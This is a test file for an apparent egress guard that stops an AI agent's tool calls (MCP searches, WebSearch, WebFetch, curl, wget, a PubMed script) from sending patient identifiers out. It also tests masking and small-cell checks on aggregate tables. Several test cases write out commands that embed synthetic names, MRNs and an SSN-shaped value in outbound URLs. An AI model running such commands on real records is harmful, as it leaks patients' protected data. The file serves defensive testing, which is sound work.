      withFile(root, "data/claims.tsv", "claim_number\tmember_id\nCLM-55501\tMBR-0099\n")
      expect(buildIndex(root).code).toBe(0)
      expectAll(root, "allow", NORMAL_QUERIES)
      const denied = verdicts(root, [
        ["mcp__pubmed-mcp-server__pubmed_search_articles", { query: "sepsis outcomes zed testperson" }],
        ["mcp__paperclip__search", { query: "Testperson, Zed readmission" }],
        ["mcp__paperclip__search", { query: "Zed   TESTPERSON" }],
        ["mcp__notion__notion-create-pages", { pages: [{ content: "follow up on fake0002" }] }],
        ["mcp__paperclip__search", { query: "claim CLM-55501 denial" }],
        ["mcp__paperclip__search", { query: "member 0099 history" }],
      ])
      for (const v of denied) expect({ ...v, config }).toEqual({ tool: v.tool, input: v.input, decision: "deny", kind: "egress", config })
      const message = runGuard(root, "mcp__paperclip__search", { query: "Zed Testperson sepsis" })
      expect(message.decision).toBe("deny")
      expect(message.reason).toContain("identifier index")
      for (const value of ["Zed", "Testperson", "zed testperson"]) expect(message.stdout).not.toContain(value)
    }
  })

  test("a 200k-entry index keeps the decision under 100 ms and adds under 30 ms end to end", () => {
    const root = project(APPROVED)
    const make = "import json, secrets, hashlib, sys\n" +
      "hs = sorted({hashlib.sha256(secrets.token_bytes(8)).hexdigest()[:16] for _ in range(200000)})\n" +
      "json.dump({'version': 1, 'salt': secrets.token_hex(16), 'width': 16, 'count': len(hs), 'hashes': ''.join(hs)}, open(sys.argv[1], 'w'))"
    expect(Bun.spawnSync(["python3", "-c", make, indexPath(root)]).exitCode).toBe(0)
    const query = { query: "propensity score overlap weighting ICU delirium sepsis bundle 2015 to 2025 mortality Hernan" }
    // Each run loads the guard afresh and decides, as a hook call does. Two warm-up runs, then the
    // median of seven, so one run slowed by machine load cannot fail the 100 ms bound.
    const timing = "import importlib.util, json, sys, time\n" +
      "def run():\n" +
      "    t = time.perf_counter()\n    spec = importlib.util.spec_from_file_location('guard', sys.argv[1])\n" +
      "    g = importlib.util.module_from_spec(spec); spec.loader.exec_module(g)\n    call = json.loads(sys.argv[2])\n" +
      "    result = g.classify(call, g.resolve_mode(call))\n    return (time.perf_counter() - t) * 1000, result\n" +
      "for _ in range(2): run()\nruns = [run() for _ in range(7)]\n" +
      "print(json.dumps({'ms': sorted(ms for ms, _ in runs)[3], 'results': [r for _, r in runs]}))"
    const payload = JSON.stringify({ cwd: root, tool_name: "mcp__paperclip__search", tool_input: query })
    const inProcess = JSON.parse(Bun.spawnSync(["python3", "-I", "-S", "-c", timing, guard, payload]).stdout.toString())
    expect(inProcess.results).toEqual(Array(7).fill(null))
    expect(inProcess.ms).toBeLessThan(100)
    const timed = (cwd: string) => {
      const start = performance.now()
      runGuard(cwd, "mcp__paperclip__search", query)
      return performance.now() - start
    }
    const bare = project(APPROVED)
    timed(bare)
    // Paired, interleaved runs so machine load hits both sides alike.
    const deltas = Array.from({ length: 7 }, () => timed(root) - timed(bare)).sort((a, b) => a - b)
    expect(deltas[3]).toBeLessThan(30)
  })

  test("without an index the check is silent", () => {
    const root = project(SCHEMA_ONLY)
    expectAll(root, "allow", [["mcp__paperclip__search", { query: "Zed Testperson sepsis" }], ...NORMAL_QUERIES])
  })
})

describe("limit 2c: Claude web egress checks (every mode)", () => {
  test("WebSearch queries and WebFetch URLs/prompts block indexed identifiers without echoing them", () => {
    for (const config of [SCHEMA_ONLY, APPROVED]) {
      const root = project(config)
      expect(buildIndex(root).code).toBe(0)
      expectAll(root, "allow", [
        ["WebSearch", { query: "sepsis outcomes randomized trial systematic review" }],
        ["WebFetch", { url: "https://example.org/article?doi=10.1001/jama.2023.12345", prompt: "Summarize the abstract" }],
      ])
      const denied = verdicts(root, [
        ["WebSearch", { query: "outcomes for Zed Testperson" }],
        ["WebSearch", { query: "record FAKE0001" }],
        ["WebFetch", { url: "https://example.org/?record=FAKE0001", prompt: "Summarize the article" }],
        ["WebFetch", { url: "https://example.org/article", prompt: "Look up Zed Testperson" }],
        ["WebFetch", { url: "https://example.org/contact?email=patient@example.org", prompt: "Summarize the page" }],
      ])
      for (const result of denied) {
        expect({ ...result, config }).toEqual({ tool: result.tool, input: result.input, decision: "deny", kind: "egress", config })
      }
      const message = runGuard(root, "WebSearch", { query: "outcomes for Zed Testperson" })
      expect(message.reason).toContain("egress guard")
      expect(message.stdout).not.toContain("Zed")
      expect(message.stdout).not.toContain("Testperson")
    }
  })

  test("the plugin hook is registered for both Claude web tools", () => {
    const hooks = JSON.parse(readFileSync(path.join(pluginRoot, "hooks", "hooks.json"), "utf8"))
    const matcher = hooks.hooks.PreToolUse[0].matcher as string
    expect(matcher).toContain("WebFetch")
    expect(matcher).toContain("WebSearch")
  })
})

describe("limit 3: NCBI E-utilities calls from Bash get the MCP checks (every mode)", () => {
  const pubmedScript = path.join(pluginRoot, "skills", "method-pubmed", "scripts", "pubmed_search.py")
  const eutils = "https://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi?db=pubmed&term="
  test("identifier patterns and index hits in curl, wget, and the method-pubmed script are denied", () => {
    for (const config of [SCHEMA_ONLY, APPROVED]) {
      const root = project(config)
      expect(buildIndex(root).code).toBe(0)
      const denied = verdicts(root, [
        ["Bash", bash(`curl -s '${eutils}zed+testperson+sepsis'`)],
        ["Bash", bash(`curl -s "${eutils}Testperson%2C%20Zed"`)],
        ["Bash", bash(`wget -qO- '${eutils}MRN+00123456'`)],
        ["Bash", bash(`curl -s '${eutils.replace("&term=", "")}' --data-urlencode 'term=123-45-6789'`)],
        ["Bash", bash(`uv run --with biopython python3 ${pubmedScript} "zed testperson outcomes" --max 20`)],
        ["Bash", bash(`python3 ${pubmedScript} "sepsis FAKE0001" --out analysis/pubmed/x.csv`)],
      ])
      for (const v of denied) expect({ ...v, config }).toEqual({ tool: v.tool, input: v.input, decision: "deny", kind: "egress", config })
      expectAll(root, "allow", [
        ["Bash", bash(`curl -s '${eutils}sepsis+bundle+Hernan[au]'`)],
        ["Bash", bash(`curl -s 'https://eutils.ncbi.nlm.nih.gov/entrez/eutils/efetch.fcgi?db=pubmed&id=31978945,32109013'`)],
        ["Bash", bash(`uv run --with biopython python3 ${pubmedScript} "sepsis bundle compliance ICU" --years 10 --out analysis/pubmed/s.csv`)],
      ])
    }
  })
})

describe("limit 4: schema-peek masks headers that are themselves identifiers", () => {
  test("a header in the identifier index or shaped like an identifier prints as col_<k> [masked header]", () => {
    const root = project(SCHEMA_ONLY)
    expect(buildIndex(root).code).toBe(0)
    const rows = Array.from({ length: 12 }, (_, i) => `R${i},${i % 3},${i % 2},${i % 4},${40 + i}`).join("\n")
    withFile(root, "data/wide.csv", `record_id,Zed Testperson,zed.t@example.com,MRN 00123456,age\n${rows}\n`)
    const proc = Bun.spawnSync(["python3", helper, "data/wide.csv"], { cwd: root })
    const out = proc.stdout.toString()
    expect(out).toContain("| record_id |")
    expect(out).toContain("| age |")
    expect(out).toContain("| col_2 [masked header] |")
    expect(out).toContain("| col_3 [masked header] |")
    expect(out).toContain("| col_4 [masked header] |")
    for (const value of ["Zed", "Testperson", "zed.t@example.com", "00123456"]) expect({ value, leaked: out.includes(value) }).toEqual({ value, leaked: false })
  })
})

describe("one definition of identifier normalization and hashing", () => {
  const block = (file: string) => {
    const text = readFileSync(file, "utf8")
    const match = text.match(/# --- identifier index: [\s\S]*?# --- end identifier index ---/)
    if (!match) throw new Error(`no shared identifier block in ${file}`)
    return match[0]
  }
  test("the hook, the indexer, and every schema-peek copy share the block byte for byte", () => {
    const canonical = block(guard)
    const skillCopies = [["method-setup", "schema-peek.py"], ["method-work", "schema-peek.py"], ["method-setup", "method-identifier-index"], ["method-data-qa", "method-identifier-index"]]
    for (const file of [indexer, safeRun, helper, ...skillCopies.map(([s, f]) => path.join(pluginRoot, "skills", s, "scripts", f))]) {
      expect({ file, same: block(file) === canonical }).toEqual({ file, same: true })
    }
  })
})

const AGGREGATE_MD = "| Characteristic | Exposed (n=120) | Unexposed (n=180) |\n|---|---|---|\n| Age, mean (SD) | 61.2 (11.0) | 59.8 (12.1) |\n" +
  "| Female, n (%) | 64 (53.3) | 90 (50.0) |\n| Died, n (%) | 0 (0.0) | 12 (6.7) |\n"

const aggregateReader = path.join(pluginRoot, "scripts", "method-aggregate-read")
function readAggregate(cwd: string, ...files: string[]) {
  const proc = Bun.spawnSync([aggregateReader, ...files], { cwd })
  return { code: proc.exitCode, out: proc.stdout.toString(), err: proc.stderr.toString() }
}

describe("limit 5: aggregate outputs are readable in schema-only mode when they pass the aggregate check", () => {
  test("passing CSV/TSV tables print through method-aggregate-read; passing Markdown tables also via Read and cat", () => {
    const root = project(SCHEMA_ONLY)
    withFile(root, "output/table1.csv", AGGREGATE_CSV)
    withFile(root, "results/table1.tsv", AGGREGATE_CSV.replaceAll(",", "\t"))
    withFile(root, "analysis/publication/table1.md", AGGREGATE_MD)
    expect(readAggregate(root, "output/table1.csv")).toEqual({ code: 0, out: AGGREGATE_CSV, err: "" })
    expect(readAggregate(root, "results/table1.tsv").out).toBe(AGGREGATE_CSV.replaceAll(",", "\t"))
    expect(readAggregate(root, "analysis/publication/table1.md").out).toBe(AGGREGATE_MD)
    expectAll(root, "allow", [
      ["Bash", bash(`${aggregateReader} output/table1.csv results/table1.tsv`)],
      ["Read", { file_path: "analysis/publication/table1.md" }],
      ["Bash", bash("cat analysis/publication/table1.md")],
    ])
  })

  test("tables that fail a rule are denied with the rule named and no value echoed", () => {
    const root = project(SCHEMA_ONLY)
    expect(buildIndex(root).code).toBe(0)
    withFile(root, "output/small.md", AGGREGATE_MD.replace("12 (6.7)", "7 (3.9)"))
    withFile(root, "output/small.csv", "group,n\nexposed,120\nunexposed,7\n")
    withFile(root, "output/ids.csv", "patient_name,n\nall,300\n")
    withFile(root, "output/indexed.csv", "group,n\nZed Testperson,300\n")
    withFile(root, "results/long.csv", "group,n\n" + Array.from({ length: 501 }, (_, i) => `g${i},${100 + i}`).join("\n") + "\n")
    withFile(root, "analysis/plot_small.py", "import pandas as pd\nprint(pd.read_csv('output/small.csv'))\n")
    const cases: Array<[string, Record<string, unknown>, string]> = [
      ["Read", { file_path: "output/small.md" }, "small-cell rule"],
      ["Bash", bash("cat output/small.md"), "small-cell rule"],
    ]
    for (const [tool, input, rule] of cases) {
      const result = runGuard(root, tool, input)
      expect({ input, decision: result.decision, named: result.reason.includes(rule) }).toEqual({ input, decision: "deny", named: true })
      for (const value of ["Zed", "Testperson", "3.9", "unexposed,7"]) expect(result.stdout).not.toContain(value)
    }
    for (const [file, rule] of [["output/small.csv", "small-cell rule"], ["output/ids.csv", "column heading names an identifier"],
      ["output/indexed.csv", "identifier index"], ["results/long.csv", "more than 500 rows"]]) {
      const result = readAggregate(root, file)
      expect({ file, code: result.code, out: result.out, named: result.err.includes(rule) }).toEqual({ file, code: 1, out: "", named: true })
      for (const value of ["Zed", "Testperson", "unexposed,7"]) expect(result.err).not.toContain(value)
    }
    expectAll(root, "deny", [["Bash", bash("python3 analysis/plot_small.py")]])
  })

  test("phi_environment.aggregate_dirs replaces the defaults, and data_root always wins", () => {
    for (const list of ["  aggregate_dirs: [tables, data/summary]\n", "  aggregate_dirs:\n    - tables\n    - \"data/summary\"\n"]) {
      const root = project("phi_environment:\n  mode: schema-only\n" + list + "stack_profile:\n  data_root: data\n")
      withFile(root, "tables/table1.csv", AGGREGATE_CSV)
      withFile(root, "output/table1.csv", AGGREGATE_CSV)
      withFile(root, "data/summary/table1.csv", AGGREGATE_CSV)
      expect(readAggregate(root, "tables/table1.csv")).toEqual({ code: 0, out: AGGREGATE_CSV, err: "" })
      for (const file of ["output/table1.csv", "data/summary/table1.csv"]) expect({ file, code: readAggregate(root, file).code }).toEqual({ file, code: 1 })
      expectAll(root, "deny", [
        ["Read", { file_path: "tables/table1.csv" }],
        ["Read", { file_path: "data/summary/table1.csv" }],
        ["Bash", bash("cat data/summary/table1.csv")],
      ])
    }
  })
})

describe("pre-rename state folder: the data helpers refuse instead of running without the boundary", () => {
  const LEGACY = ".ce-datascience" // rebrand:keep
  function legacyProject() {
    const root = project(undefined, { ceDir: false })
    mkdirSync(path.join(root, LEGACY))
    writeFileSync(path.join(root, LEGACY, "config.local.yaml"), APPROVED)
    return root
  }

  test("method-safe-run, method-identifier-index, and schema-peek exit 2 with the move command", () => {
    const root = legacyProject()
    const peek = Bun.spawnSync(["python3", helper, path.join(root, "data", "cohort.csv")], { cwd: root })
    for (const { code, out } of [
      runSafe(root, "true"),
      buildIndex(root),
      { code: peek.exitCode, out: peek.stdout.toString() },
    ]) {
      expect(code).toBe(2)
      expect(out).toContain(`mv ${LEGACY} .methodsmith`)
      expect(out).not.toContain("FAKE0001")
    }
    expect(existsSync(path.join(root, ".methodsmith"))).toBe(false)
  })

  test("the guard still applies the old folder's data_root, identifier index, and run outputs", () => {
    // Build the state in a current project, then move it back to the pre-rename name.
    const root = project("phi_environment:\n  mode: approved\nstack_profile:\n  data_root: secure\n")
    withFile(root, "secure/notes.txt", "synthetic note\n")
    withFile(root, "secure/cohort.csv", "record_id,patient_name\nFAKE0001,Zed Testperson\n")
    withFile(root, "results/out.txt", "synthetic output\n")
    expect(buildIndex(root).code).toBe(0)
    expect(existsSync(indexPath(root))).toBe(true)
    withFile(root, ".methodsmith/runs/outputs.txt", "results/out.txt\n")
    renameSync(path.join(root, ".methodsmith"), path.join(root, LEGACY))
    const [secure, output, egress, readme] = verdicts(root, [
      ["Read", { file_path: path.join(root, "secure", "notes.txt") }],
      ["Read", { file_path: path.join(root, "results", "out.txt") }],
      ["mcp__paperclip__search", { query: "Zed Testperson sepsis" }],
      ["mcp__paperclip__search", { query: "sepsis bundle mortality" }],
    ])
    expect([secure.decision, output.decision, egress.decision, readme.decision]).toEqual(["deny", "deny", "deny", "allow"])
    expect(egress.kind).toBe("egress")
  })

  test("once moved, the helpers run normally", () => {
    const root = project(SCHEMA_ONLY)
    expect(runSafe(root, "true").code).toBe(0)
  })
})
